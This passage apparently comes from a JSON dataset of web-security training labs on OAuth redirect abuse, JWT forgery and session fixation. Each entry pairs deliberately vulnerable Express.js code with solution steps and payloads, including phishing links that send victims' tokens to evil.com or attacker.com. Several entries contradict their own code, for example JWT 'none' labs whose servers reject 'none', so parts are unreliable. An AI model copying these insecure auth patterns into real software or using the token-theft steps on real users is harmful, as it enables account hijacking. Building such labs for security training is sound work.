    "payloads": [
      "Redirect URL: https://evil.com/callback",
      "Phishing OAuth link: /authorize?client_id=trusted-client&redirect_uri=https://evil.com/callback&response_type=code",
      "Token exchange: POST /token { code: 'oauth-code-123' }"
    ]
  },
  {
    "Lab scenario": "GraphQL JWT Expiration Bypass via Clock Skew",
    "Lab Description": "This GraphQL API uses JWTs for authentication and verifies token expiration using `exp`. The application is vulnerable to clock skew due to poor validation of token timestamps. To solve: forge a token with future expiration, exploit clock desync, and access the user's secret notes.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Log in to obtain a valid JWT from Authorization header in GraphQL requests.",
      "Decode JWT and observe 'exp' timestamp.",
      "Use Postman to modify 'exp' to a large future timestamp (e.g., year 2030).",
      "Sign the modified token using the known dev secret exposed in logs.",
      "Send GraphQL request to query { secretNotes } using the forged token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const secret = 'devmode-secret'; const schema = buildSchema(`type Query { secretNotes: String }`); const root = { secretNotes: (args, context) => { if (context.user === 'carlos') return 'Top Secret Notes'; else throw new Error('Unauthorized'); } }; app.use('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret); req.user = decoded.user; graphqlHTTP({ schema, rootValue: root, context: { user: decoded.user }, graphiql: false })(req, res); } catch { res.status(401).send('Invalid token'); } }); app.listen(6000);",
    "payloads": [
      "JWT payload: {\"user\":\"carlos\",\"exp\":1893456000}",
      "Authorization: Bearer [forged-token]",
      "GraphQL query: { secretNotes }"
    ]
  },
  {
    "Lab scenario": "Session Fixation in Login Flow via URL Parameter",
    "Lab Description": "The application allows users to specify a session ID via a URL query parameter during login. This session ID is later used without regeneration after authentication. The application trusts the client-supplied session ID even after successful login. To solve: Fix a session ID, trick the victim to log in using it, and access their authenticated session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to analyze the login request and notice that the session ID is accepted via a GET parameter (?session=).",
      "2. Generate a session ID and craft a phishing URL: /login?session=fixed1234.",
      "3. Send this link to the victim (e.g., simulate by logging in as victim using this link).",
      "4. After victim logs in via the crafted link, the session remains fixed to 'fixed1234'.",
      "5. Set your own cookie to 'session=fixed1234' and access /my-account to hijack victim's session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'hunter2' }]; const sessions = {}; app.get('/login', (req, res) => { const { session } = req.query; if (session) { res.cookie('session', session); res.send('<form method=\"POST\" action=\"/authenticate\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); } else { res.send('Missing session ID'); } }); app.post('/authenticate', (req, res) => { let body = ''; req.on('data', chunk => body += chunk); req.on('end', () => { const [u, p] = body.split('&').map(p => p.split('=')[1]); const user = users.find(x => x.username === decodeURIComponent(u) && x.password === decodeURIComponent(p)); if (user) { const session = req.cookies.session; sessions[session] = user.username; res.redirect('/my-account'); } else { res.send('Invalid'); } }); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (sessions[session]) { res.send(`Welcome ${sessions[session]}`); } else { res.send('Not logged in'); } }); app.listen(4000);",
    "payloads": [
      "GET /login?session=fixed1234",
      "POST /authenticate (with valid creds)",
      "Cookie: session=fixed1234",
      "GET /my-account"
    ]
  },
  {
    "Lab scenario": "JWT Tampering in Authorization Header using 'none' Algorithm",
    "Lab Description": "This lab uses JWT for session management. The backend verifies JWTs but fails to properly enforce the algorithm specified in the token header. It incorrectly accepts the 'alg':'none' value, skipping signature verification. To solve: Modify a valid JWT by setting alg to none and remove the signature to impersonate Carlos.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Log in with your own account and intercept the Authorization: Bearer <JWT> using Burp Suite.",
      "2. Decode the JWT using jwt.io or Postman and observe the header and payload.",
      "3. Modify the header to {'alg':'none'} and the payload to {'username':'carlos'}",
      "4. Remove the signature portion entirely.",
      "5. Use Postman to send GET /my-account with Authorization: Bearer <tampered_token>."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'admin123' }]; app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); res.send(`Welcome ${decoded.username}`); } catch (err) { res.status(403).send('Invalid token'); } }); app.listen(4001);",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"carlos\"}",
      "Token format: base64url(header).base64url(payload)",
      "Authorization: Bearer <tampered_token>"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Redirect URI Validation",
    "Lab Description": "The application integrates OAuth for authentication. However, it fails to strictly validate the redirect_uri parameter, allowing redirection to attacker-controlled domains. The access token is exposed via URL fragment. To solve: Capture Carlos’s access token by injecting an attacker-controlled redirect URI and replay the token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to intercept the OAuth flow and identify redirect_uri used in /authorize endpoint.",
      "2. Craft a malicious URL: /authorize?client_id=123&redirect_uri=https://evil.com&response_type=token.",
      "3. Simulate sending the link to Carlos and simulate login at /login as Carlos.",
      "4. Observe the token in the fragment at evil.com/#access_token=<token>",
      "5. Use Postman to send Authorization: Bearer <token> to /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const users = [{ username: 'carlos', password: 'qwerty' }]; const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type === 'token') { const token = Math.random().toString(36).substring(2); tokens[token] = 'carlos'; res.redirect(`${redirect_uri}#access_token=${token}`); } else { res.send('Invalid flow'); } }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; if (tokens[token]) res.send(`Welcome ${tokens[token]}`); else res.send('Invalid token'); }); app.listen(4002);",
    "payloads": [
      "/authorize?client_id=123&redirect_uri=https://evil.com&response_type=token",
      "https://evil.com/#access_token=<leaked_token>",
      "Authorization: Bearer <leaked_token>",
      "GET /my-account"
    ]
  },
  {
    "Lab scenario": "Session Fixation in Login Flow",
    "Lab Description": "The application uses a session cookie that is not regenerated upon authentication. This enables session fixation, allowing attackers to set a session ID before login. To solve: gain access to Carlos's account by fixing a session and tricking him into logging in with it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a GET /login request using Burp Suite Proxy and extract the Set-Cookie header value.",
      "Send Carlos a phishing link embedding the fixed session ID using the session cookie you captured.",
      "Wait for Carlos to log in with the fixed session ID (simulate login using a prepared request or provided browser tools).",
      "Reuse the same session ID in your browser and access /my-account.",
      "Confirm Carlos’s session by accessing /my-account with the hijacked session cookie."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'carlos123' }]; const sessions = {}; app.get('/login', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sid] = username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user) { res.send('Welcome back, ' + user); } else { res.status(403).send('Unauthorized'); } }); app.listen(4001);",
    "payloads": [
      "GET /login HTTP/1.1",
      "Cookie: sid=fixedSessionID",
      "POST /login HTTP/1.1 with fixed sid",
      "Access /my-account using sid=fixedSessionID"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Tampering in Authorization Header",
    "Lab Description": "This app uses JWTs to manage access control. Due to improper validation, it accepts tokens signed with the 'none' algorithm. To solve: tamper with a JWT to impersonate the user carlos and access the protected resource /admin-panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a valid JWT from your login using Authorization: Bearer <token>.",
      "Decode the token using jwt.io and observe the algorithm is HS256.",
      "Replace the alg field in the header with 'none' and modify the payload to {\"username\":\"carlos\"}.",
      "Remove the signature part and send the unsigned JWT as Authorization: Bearer <tampered_token> to /admin-panel.",
      "Verify successful access by viewing the admin dashboard with Carlos’s privileges."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; const users = [{ username: 'carlos', password: 'jwtpass', role: 'admin' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(403).send('Unauthorized'); } }); app.get('/admin-panel', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret); if (decoded.role === 'admin') { res.send('Welcome Admin ' + decoded.username); } else { res.status(403).send('Access Denied'); } } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4002);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
      "Unsigned JWT: <base64Header>.<base64Payload>.",
      "Authorization: Bearer <tampered_token>"
    ]
  },
  {
    "Lab scenario": "OAuth Authorization Code Interception in Redirect Flow",
    "Lab Description": "This lab has a vulnerable OAuth implementation where the authorization code is sent to an open redirector that leaks it to an attacker. To solve: intercept the code from the OAuth provider and exchange it for an access token to impersonate Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start OAuth login flow and observe the redirection to /callback?code=<auth_code>&state=xyz.",
      "Use Burp Suite to modify the redirect_uri to attacker.com/capture during authorization request.",
      "On attacker.com, capture the leaked code from your server logs.",
      "Manually send a POST request to the token endpoint with the stolen code using Postman.",
      "Use the obtained access token to call /userinfo and retrieve Carlos’s profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const oauthTokens = {}; const codes = { 'authcode123': 'carlos_token' }; app.get('/callback', (req, res) => { const code = req.query.code; if (codes[code]) { const token = codes[code]; oauthTokens[token] = 'carlos'; res.send('Access token: ' + token); } else { res.status(400).send('Invalid code'); } }); app.get('/userinfo', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (oauthTokens[token]) { res.send('User info for: ' + oauthTokens[token]); } else { res.status(403).send('Unauthorized'); } }); app.listen(4003);",
    "payloads": [
      "https://auth-server.com/oauth?client_id=xyz&redirect_uri=https://attacker.com/capture",
      "Extract code from /capture endpoint logs",
      "POST /token with code=authcode123",
      "GET /userinfo with Authorization: Bearer carlos_token"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion leading to signature bypass",
    "Lab Description": "This lab's JWT authentication mechanism is vulnerable to algorithm confusion. The application incorrectly accepts unsigned tokens when the alg header is set to 'none'. To solve the lab, gain access to the administrator's account by bypassing the JWT signature verification.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a valid JWT by logging in with a user account and capturing the Authorization: Bearer token.",
      "In Burp Repeater, decode the JWT and observe that the alg header is set to HS256 and contains a valid signature.",
      "Change the alg field from HS256 to none, and remove the signature part (third segment). Replace the payload's sub value with 'admin'.",
      "Send the modified JWT in an Authorization: Bearer header in a GET request to /admin or /my-account.",
      "If the bypass works, the admin panel will load, solving the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', role: 'admin' }, { username: 'user', role: 'user' }]; const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const user = users.find(u => u.username === username); if (!user) return res.status(401).send('Invalid user'); const token = jwt.sign({ sub: username, role: user.role }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); return res.send(`Welcome ${payload.sub}`); } try { const payload = jwt.verify(token, secret); res.send(`Welcome ${payload.sub}`); } catch (e) { res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Algorithm Confusion Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
      "{\"alg\":\"none\"}.{ \"sub\":\"admin\",\"role\":\"admin\" }."
    ]
  },
  {
    "Lab scenario": "Session fixation via URL-based session ID",
    "Lab Description": "The session management mechanism is vulnerable due to reliance on session IDs passed through URLs. The application does not properly regenerate session identifiers after authentication. To solve the lab, log in as the victim by planting a known session ID before they log in and then reuse it.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to identify that the application transmits session ID using a GET parameter (e.g., /login?sid=...).",
      "Visit the login page and copy the current session ID from the URL.",
      "Send the malicious session ID to the victim (simulate via crafted link or CSRF).",
      "Wait for the victim to authenticate using the same session ID.",
      "Revisit the same session ID yourself to gain access to the authenticated session and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = { 'carlos': 'hunter2' }; app.get('/login', (req, res) => { const sid = req.query.sid || Math.random().toString(36).substr(2); sessions[sid] = sessions[sid] || { loggedIn: false, username: null }; res.send(`<form method='POST' action='/do-login?sid=${sid}'><input name='username'><input name='password'><button>Login</button></form>`); }); app.post('/do-login', (req, res) => { let body = ''; req.on('data', chunk => { body += chunk.toString(); }); req.on('end', () => { const params = new URLSearchParams(body); const { username, password } = Object.fromEntries(params); const sid = req.query.sid; if (users[username] === password) { sessions[sid].loggedIn = true; sessions[sid].username = username; res.redirect(`/my-account?sid=${sid}`); } else { res.send('Login failed'); } }); }); app.get('/my-account', (req, res) => { const sid = req.query.sid; const session = sessions[sid]; if (session && session.loggedIn) { res.send(`Welcome ${session.username}`); } else { res.status(403).send('Not logged in'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "/login?sid=attackerSession123",
      "/do-login?sid=attackerSession123",
      "/my-account?sid=attackerSession123"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leakage via referer header",
    "Lab Description": "This lab demonstrates a token leakage vulnerability in OAuth 2.0's implicit flow. The access token is embedded in the URL fragment and can leak through referer headers to third-party domains. To solve the lab, capture the admin's token via referer leakage and access their profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to observe that after login, the access_token is passed in the URL fragment (/#access_token=...).",
      "Set up a malicious page on attacker.com which causes a redirect to the OAuth callback endpoint with a link to attacker.com as a resource.",
      "Trick the victim (admin) into visiting this link. Observe the referer header sent to attacker.com containing the access token.",
      "Use the stolen token to access /my-account or /profile endpoint by attaching it as Authorization: Bearer in a request.",
      "If the token is valid, the response will reveal the admin's account details."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const users = { 'admin': { token: 'admintoken123', role: 'admin' } }; app.get('/callback', (req, res) => { res.send(`<script>window.location='#access_token=admintoken123';</script>`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth || !auth.startsWith('Bearer ')) return res.status(401).send('Unauthorized'); const token = auth.split(' ')[1]; const user = Object.entries(users).find(([_, u]) => u.token === token); if (user) return res.send(`Welcome ${user[0]}`); res.status(403).send('Invalid token'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Referer Leak Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "http://attacker.com/#access_token=admintoken123",
      "Authorization: Bearer admintoken123"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Cookie Injection in OAuth Redirect Flow",
    "Lab Description": "The application integrates third-party OAuth login but does not invalidate existing session cookies during the authentication redirect chain. The application reuses an attacker-controlled session post-login. To solve: Fixate a session via the redirect endpoint and access the victim's account page after they complete OAuth login.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the initial GET /auth/oauth/redirect request in Burp Suite and note the Set-Cookie: session=XYZ behavior before authentication.",
      "Send the request to Burp Repeater and manually inject your session cookie into the response with a fixed value.",
      "Craft a malicious OAuth URL that sends the victim through the login flow while binding your session cookie in the initial redirect.",
      "Use social engineering to get the victim to complete the OAuth flow using the crafted URL.",
      "Once the victim completes the OAuth flow, access the /account endpoint using the same session cookie and confirm access to the victim's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'fixationkey', resave: false, saveUninitialized: true })); app.get('/auth/oauth/redirect', (req, res) => { if (!req.session.user) { req.session.oauthState = 'init'; res.redirect('https://auth.provider.com/login?redirect_uri=/auth/callback'); } else { res.redirect('/account'); } }); app.get('/auth/callback', (req, res) => { req.session.user = { username: 'carlos' }; res.redirect('/account'); }); app.get('/account', (req, res) => { if (!req.session.user) return res.status(403).send('Unauthorized'); res.send('Welcome ' + req.session.user.username); }); app.listen(3000, () => console.log('OAuth Fixation Lab running'));",
    "payloads": [
      "GET /auth/oauth/redirect HTTP/1.1\\nHost: vulnerable-site.com\\nCookie: session=attacker123",
      "https://vulnerable-site.com/auth/oauth/redirect?next=/auth/callback (sent to victim)",
      "Access /account using Cookie: session=attacker123 after victim OAuth login"
    ]
  },
  {
    "Lab scenario": "JWT Algorithm Confusion in Authorization Header",
    "Lab Description": "The backend improperly trusts the 'alg' header in JWT tokens, allowing attackers to switch the algorithm from RS256 to HS256 and sign tokens with a known public key. To solve: Forge a JWT for the 'admin' user and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a JWT during login using Burp Suite. Decode it using jwt.io or Postman.",
      "Inspect the 'alg' header and observe it uses 'RS256'.",
      "Extract the embedded 'kid' value or use the known public key from the /.well-known endpoint if available.",
      "Modify the JWT header to use 'HS256' instead of 'RS256'.",
      "Sign a new JWT for the 'admin' user using the public key as the HMAC key.",
      "Send the forged JWT in Authorization: Bearer header to /admin-dashboard and verify admin access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const pubKey = fs.readFileSync('./public.pem'); app.use((req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('Missing token'); try { const decoded = jwt.verify(token, pubKey); req.user = decoded; next(); } catch (err) { res.status(403).send('Invalid token'); } }); app.get('/admin-dashboard', (req, res) => { if (req.user.username !== 'admin') return res.status(403).send('Access denied'); res.send('Welcome admin!'); }); app.listen(4000, () => console.log('JWT Confusion Lab running'));",
    "payloads": [
      "{ \"alg\": \"HS256\", \"typ\": \"JWT\" }.{ \"username\": \"admin\" }",
      "Sign with HMAC using public key from /.well-known/jwks.json or /public.pem",
      "Authorization: Bearer [forged_token]"
    ]
  },
  {
    "Lab scenario": "OAuth Token Disclosure via Open Redirect in Redirect URI",
    "Lab Description": "The OAuth client incorrectly validates redirect URIs, allowing attackers to inject a redirect endpoint that leaks access tokens. To solve: Capture an OAuth token by redirecting the victim’s login flow to your controlled domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Find the login flow that redirects to /oauth/authorize?redirect_uri=... and test for open redirect injection using tools like OWASP ZAP.",
      "Inject your attacker-controlled domain (e.g., https://evil.com) into the redirect_uri parameter.",
      "Craft a phishing link to https://vulnerable.com/oauth/authorize?redirect_uri=https://evil.com/callback",
      "Deploy a token-capturing listener on your domain to capture the OAuth access_token from the fragment/hash.",
      "After capturing the access token, use it as a Bearer token to access the victim's /account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const oauthTokens = {}; app.get('/oauth/authorize', (req, res) => { const { redirect_uri } = req.query; const token = 'token-' + Math.random().toString(36).substring(2); oauthTokens[token] = { username: 'carlos' }; res.redirect(redirect_uri + '#access_token=' + token); }); app.get('/account', (req, res) => { const auth = req.headers.authorization; const token = auth?.split(' ')[1]; if (!token || !oauthTokens[token]) return res.status(403).send('Access denied'); res.send('Welcome ' + oauthTokens[token].username); }); app.listen(5000, () => console.log('OAuth Token Leak Lab running'));",
    "payloads": [
      "https://vulnerable.com/oauth/authorize?redirect_uri=https://evil.com/callback",
      "GET /account HTTP/1.1\\nAuthorization: Bearer token-[captured]",
      "Set up https://evil.com to log access_token from fragment"
    ]
  },
    {
      "Lab scenario": "Session fixation via password reset endpoint",
      "Lab Description": "The application's session management fails to invalidate active sessions post-password reset. The application assigns a new session ID only after login, allowing an attacker to exploit a fixed session during password reset. To solve: Fixate a session prior to victim login and hijack their session post-reset to access their dashboard.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite to send a GET /reset-password request while logged out and capture the Set-Cookie response containing the session ID.",
        "2. Use Burp Proxy to initiate a password reset request for carlos using this fixed session ID and wait for the victim to reset their password.",
        "3. Once the victim logs in, reuse the same session ID captured previously to gain access to the victim’s session.",
        "4. Confirm session fixation worked by navigating to /dashboard with the hijacked session.",
        "5. Capture the session token and validate access to carlos's account via Burp Repeater."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixedsession', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'oldpass' }]; app.post('/reset-password', (req, res) => { const { username } = req.body; req.session.username = username; res.send('Password reset initiated. Check your email.'); }); app.post('/update-password', (req, res) => { const { username, newPassword } = req.body; const user = users.find(u => u.username === username); if (user) { user.password = newPassword; res.send('Password updated.'); } else { res.status(400).send('User not found'); } }); app.get('/dashboard', (req, res) => { if (req.session.username) return res.send('Dashboard for ' + req.session.username); res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
      "payloads": [
        "GET /reset-password",
        "POST /reset-password username=carlos",
        "POST /update-password username=carlos&newPassword=hacked123",
        "GET /dashboard (with hijacked session cookie)"
      ]
    },
    {
      "Lab scenario": "JWT signature bypass via 'none' algorithm injection",
      "Lab Description": "The backend JWT validation logic fails to properly enforce algorithm verification. An attacker can craft a JWT with 'alg':'none' and bypass verification, gaining unauthorized access. To solve: Forge a JWT token using 'none' algorithm and access Carlos’s admin panel.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Log in using a normal user account and capture the Authorization JWT token using Burp.",
        "2. Decode the JWT using jwt.io or Burp Decoder to observe its structure, especially the alg field.",
        "3. Modify the JWT header to set 'alg':'none' and the payload to impersonate carlos (e.g., {\"username\":\"carlos\"}).",
        "4. Remove the JWT signature part entirely and recombine the header and payload using Base64.",
        "5. Use Postman to send a GET /admin request with the modified JWT as Bearer token in Authorization header.",
        "6. Confirm successful privilege escalation by accessing Carlos’s admin panel."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecure'; const users = [{ username: 'carlos', role: 'admin' }, { username: 'wiener', role: 'user' }]; app.post('/login', (req, res) => { const { username } = req.body; const user = users.find(u => u.username === username); if (!user) return res.status(403).send('Invalid login'); const token = jwt.sign({ username: user.username, role: user.role }, secret); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(auth, secret, { algorithms: ['HS256'] }); if (decoded.role === 'admin') return res.send('Welcome Admin: ' + decoded.username); res.status(403).send('Access denied'); } catch { res.status(400).send('JWT error'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT None Bypass Lab running on http://localhost:' + PORT));",
      "payloads": [
        "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
        "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
        "JWT: base64(header).base64(payload).",
        "GET /admin with Authorization: Bearer [unsigned_token]"
      ]
    },
    {
      "Lab scenario": "OAuth implicit flow token leakage via referer header",
      "Lab Description": "This lab uses the OAuth 2.0 implicit grant type. The access token is returned in the fragment of the redirect URI and exposed via Referer headers during subsequent navigation. To solve: Capture the access token of Carlos from a referer leak and access /account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use OWASP ZAP to spider the OAuth flow and confirm the use of implicit grant by observing token returned in URI fragment.",
        "2. Inject a malicious redirect_uri pointing to an attacker-controlled domain with an embedded redirect to a non-HTTPS resource.",
        "3. Wait for Carlos to authorize and follow the redirection which leaks the token in Referer header to the attacker domain.",
        "4. Extract the token from HTTP access logs or intercept it using Burp Collaborator.",
        "5. Replay the stolen token via GET /account with Authorization Bearer header and confirm account access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const tokens = {}; const users = { 'carlos': { id: 1, email: 'carlos@local', role: 'user' } }; app.get('/auth', (req, res) => { const { response_type, client_id, redirect_uri, state } = req.query; if (response_type === 'token') { const token = Math.random().toString(36).substr(2); tokens[token] = 'carlos'; const redirect = `${redirect_uri}#access_token=${token}&state=${state}`; res.redirect(redirect); } else { res.status(400).send('Unsupported flow'); } }); app.get('/account', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; const user = tokens[auth]; if (user === 'carlos') return res.send('Welcome carlos'); res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Token Leak Lab running on http://localhost:' + PORT));",
      "payloads": [
        "https://vulnerable.site/auth?response_type=token&client_id=123&redirect_uri=http://evil.com/capture.html",
        "Leaked access_token from Referer: http://evil.com/capture.html#access_token=abc123",
        "GET /account with Authorization: Bearer abc123"
      ]
    },
  {
  "Lab scenario": "Session Fixation via Weak Session Handling in Login Flow",
  "Lab Description": "This lab’s session management is flawed, allowing attackers to fixate a session ID before login. The application issues a session cookie during pre-login activities but fails to regenerate it upon successful authentication, allowing fixation attacks. To solve: hijack Carlos's session by planting a known session ID and then accessing his account page after login.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
  "1. Using Burp Suite, intercept the initial GET /login request and observe that a session cookie is issued before authentication.",
  "2. Use Burp's Repeater to manually set a custom predictable session ID (e.g., sessionid=attackersession) and send a POST /login with Carlos’s credentials.",
  "3. Confirm that the session ID remains the same after login by inspecting the response headers and subsequent cookies.",
  "4. Plant the same session ID in your own browser.",
  "5. Access the /my-account page and verify you are logged in as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/login', (req, res) => { if (!req.cookies.sessionid) { res.cookie('sessionid', Math.random().toString(36).substring(2)); } res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.send('Login successful'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { res.send('Account details for session: ' + req.cookies.sessionid); }); const PORT = 5000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
  "payloads": [
  "Set-Cookie: sessionid=attackersession",
  "POST /login HTTP/1.1 with sessionid=attackersession",
  "Access /my-account with sessionid=attackersession"
  ]
  },
  {
  "Lab scenario": "JWT Algorithm Confusion Exploit in Authorization Token",
  "Lab Description": "This lab’s JWT validation is vulnerable due to algorithm confusion. It accepts unsigned tokens if alg is set to 'none'. The application incorrectly processes JWTs during authentication without verifying the algorithm correctly. To solve: forge a token to access Carlos's account without needing his password.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
  "1. Using Postman, retrieve your JWT from a legitimate login flow and inspect the header and payload.",
  "2. Decode the token with jwt.io and observe the algorithm field in the header (e.g., HS256).",
  "3. Modify the alg field to 'none' and set the payload's username to 'carlos'.",
  "4. Resign the token without a signature and use it as the Authorization header value.",
  "5. Send a GET /my-account request using the forged JWT and verify you have accessed Carlos’s account."
  ],
  "Vulnerability name": "Authentication",
